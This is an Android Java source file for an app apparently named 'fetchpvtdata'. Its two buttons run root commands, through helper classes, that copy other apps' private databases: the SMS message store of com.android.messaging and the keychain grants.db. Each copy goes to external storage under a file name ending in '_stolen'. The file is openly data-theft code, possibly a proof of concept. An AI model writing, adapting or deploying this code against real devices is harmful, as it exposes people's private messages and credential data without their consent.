package com.example.richard.fetchpvtdata;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

import com.example.richard.fetchpvtdata.utils.SuCmd;
import com.example.richard.fetchpvtdata.utils.SuCmdFactory;

import java.io.File;

public class MainActivity extends AppCompatActivity {
    // Used to load the 'native-lib' library on application startup.
    static {
        System.loadLibrary("native-lib");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        // Listener for the Java button
        Button b = findViewById(R.id.java_copy);
        b.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                RunSuCmdBg runSuCmdBg = new RunSuCmdBg(getApplicationContext());
                File srcFile = new File(
                        "/data/data/com.android.messaging/databases/bugle_db");
                File targetFile = new File(getExternalFilesDir(null),
                        srcFile.getName() + "_stolen");

                // Instantiates new command from factory
                SuCmd suCmd = SuCmdFactory.makeSuCmd(SuCmdFactory.CMD.JAVA,
                        srcFile, targetFile);

                runSuCmdBg.execute(suCmd);
            }
        });

        Button native_b = findViewById(R.id.native_copy);
        native_b.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                RunSuCmdBg runSuCmdBg = new RunSuCmdBg(getApplicationContext());
                File srcFile = new File(
                        "/data/data/com.android.keychain/databases/grants.db");
                File targetFile = new File(getExternalFilesDir(null),
                        srcFile.getName() + "_stolen");

                // Instantiates new command from factory
                SuCmd suCmd = SuCmdFactory.makeSuCmd(SuCmdFactory.CMD.NATIVE,
                        srcFile, targetFile);

                runSuCmdBg.execute(suCmd);
            }
        });
    }
}
